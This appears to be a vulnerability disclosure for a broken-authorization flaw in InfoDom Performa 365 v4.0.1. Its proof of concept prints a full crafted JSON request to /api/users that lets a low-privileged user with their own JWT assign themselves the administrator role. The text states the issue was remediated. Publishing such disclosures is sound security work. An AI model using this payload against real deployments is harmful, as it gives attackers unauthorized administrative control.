An issue in InfoDom Performa 365 v4.0.1 allows authenticated attackers to elevate their privileges to Administrator via a crafted payload sent to /api/users

PoC:
- We login as low privileged user and obtain the JWT associated with our user
- Now, we create a new request to /api/users in which we set our role to administrator and user the low privileged JWT to send the request. The body of the request:
```
{
	"rules": [{
		"property": 1,
		"syncMode": 2
	}, {
		"property": 2,
		"syncMode": 2
	}, {
		"property": 3,
		"syncMode": 2
	}, {
		"property": 4,
		"syncMode": 2
	}, {
		"property": 5,
		"syncMode": 2
	}, {
		"property": 6,
		"syncMode": 2
	}, {
		"property": 7,
		"syncMode": 2
	}, {
		"property": 8,
		"syncMode": 2
	}, {
		"property": 9,
		"syncMode": 2
	}, {
		"property": 10,
		"syncMode": 2
	}],
	"id": "<redacted>",
	"externalId": "<redacted>",
	"email": "<redacted>",
	"firstName": "<redacted>",
	"lastName": "<redacted>",
	"displayName": "<redacted",
	"status": 1,
	"active": true,
	"gender": 0,
	"address": null,
	"contactNumber": null,
	"description": null,
	"taxId": null,
	"nationalId": null,
	"image": null,
	"jobTitle": null,
	"enrolledTime": "0001-01-01T00:00:00",
	"onWaitingListTime": "0001-01-01T00:00:00",
	"userType": 1,
	"organization": null,
	"roles": [{
		"id": 1,
		"name": "Glavni administrator"
	}],
	"assignmentOrganizationRightIds": [],
	"assignmentEducationRightIds": [],
	"createdOn": "2023-12-21T13:13:06.3740398",
	"updatedOn": "2024-08-28T10:51:56.8529657",
	"isValid": true,
	"errors": null,
	"code": 200,
	"tenantId": "<redacted>",
	"userId": "<redacted>",
	"pictureChanged": false,
	"applicationRoleIds": [1]
}
```
- Going back to our original session and refreshing it results in access to administrative functions.

The vulnerability is a specific case of a broader lack of authorization vulnerability which affects multiple endpoints as specified in the report. All vulnerabilities were remediated.

For more information see the redacted Burp request.
